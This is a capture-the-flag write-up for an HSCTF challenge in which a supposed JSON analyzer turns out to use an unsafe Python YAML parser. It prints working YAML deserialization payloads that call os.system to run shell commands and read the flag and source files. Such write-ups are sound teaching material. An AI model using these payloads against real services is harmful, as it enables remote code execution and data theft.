# JSON Info

# Description:
Written by: cppio

> I made a simple program to analyze my JSON files.
>
> nc misc.hsctf.com 9999
>
> Note: You must send an EOF (normally Ctrl-D) to get a response. If netcat quits before showing any response, you may have to use socat.
>
> socat - tcp:misc.hsctf.com:9999
>
> Alternatively, try netcat's -q flag.
>
> nc -q 1 misc.hsctf.com 9999

# Solution:
- Connect to the given ip and port using netcat and try entering some input

![simple test](https://i.imgur.com/iYuAHvS.png)

At first glance it seems to work just fine and parse json correctly

- Try some invalid input and google some of the error messages, eventually you'll discover these are yaml parser errors

![error](https://i.imgur.com/gSVjaX1.png)

- Google `python yaml exploits` or `python yaml injection` and maybe find this [Talos intelligence report](https://www.talosintelligence.com/reports/TALOS-2017-0305)

- Try it out, `!!python/object/apply:os.system ["uname -a; ls"]`

![output](https://i.imgur.com/3ri5nuh.png)

works fine, so just get our flag (and the source code for the challenge) `!!python/object/apply:os.system ["cat flag.txt; cat json_info.py"]`

![output](https://i.imgur.com/RRonyIE.png)
